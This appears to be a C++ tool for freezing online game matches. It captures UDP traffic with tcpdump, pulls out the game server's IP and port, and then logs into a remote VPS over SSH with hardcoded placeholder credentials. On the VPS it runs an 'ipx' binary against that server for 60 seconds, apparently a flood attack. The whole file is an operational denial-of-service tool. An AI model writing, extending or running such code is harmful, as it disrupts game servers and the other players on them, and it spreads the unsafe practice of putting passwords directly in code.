#include <iostream>
#include <cstdlib>
#include <regex>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <libssh/libssh.h>

bool playerLanded = false;

// Simulate detecting player landing
void detectLanding() {
    std::this_thread::sleep_for(std::chrono::seconds(10));  // Simulate landing after 10 seconds
    playerLanded = true;
}

// Prompt user to freeze or not
bool promptUser() {
    std::string choice;
    std::cout << "Want to freeze? (Yes/No): ";
    std::cin >> choice;
    return (choice == "Yes" || choice == "yes" || choice == "Y" || choice == "y");
}

// Capture network data
std::string getNetworkData() {
    const char* cmd = "tcpdump -i any udp -nn -c 20 2>/dev/null";
    std::string result;
    char buffer[256];
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return "ERROR";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

// Filter fake ports
bool isFakePort(const std::string& port) {
    std::vector<std::string> fakePorts = {"20000", "17500", "443", "8080", "18000"};
    return std::find(fakePorts.begin(), fakePorts.end(), port) != fakePorts.end();
}

// Execute binary on VPS using SSH
void executeOnVPS(const std::string& ip, const std::string& port, const std::string& time) {
    ssh_session session = ssh_new();
    if (session == nullptr) return;
    ssh_options_set(session, SSH_OPTIONS_HOST, "your.vps.ip");
    ssh_options_set(session, SSH_OPTIONS_USER, "your_vps_user");
    ssh_connect(session);
    ssh_userauth_password(session, "your_vps_user", "your_vps_password");

    ssh_channel channel = ssh_channel_new(session);
    ssh_channel_open_session(channel);
    std::string command = "./ipx " + ip + " " + port + " " + time;
    ssh_channel_request_exec(channel, command.c_str());

    ssh_channel_close(channel);
    ssh_channel_free(channel);
    ssh_disconnect(session);
    ssh_free(session);
}

int main() {
    std::thread landingThread(detectLanding);  // Start landing detection

    std::regex ipPortPattern(R"((\d+\.\d+\.\d+\.\d+)\.(\d+) >)");
    std::smatch match;

    while (true) {
        std::string data = getNetworkData();
        while (std::regex_search(data, match, ipPortPattern)) {
            std::string ip = match[1];
            std::string port = match[2];
            if (!isFakePort(port)) {
                std::cout << "Valid Match IP: " << ip << ", Port: " << port << std::endl;

                if (playerLanded) {
                    if (promptUser()) {
                        executeOnVPS(ip, port, "60");
                    } else {
                        std::cout << "Execution skipped." << std::endl;
                    }
                } else {
                    executeOnVPS(ip, port, "60");
                }
                return 0;
            }
            data = match.suffix();
        }
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    landingThread.join();  // Wait for landing detection to finish
    return 0;
}
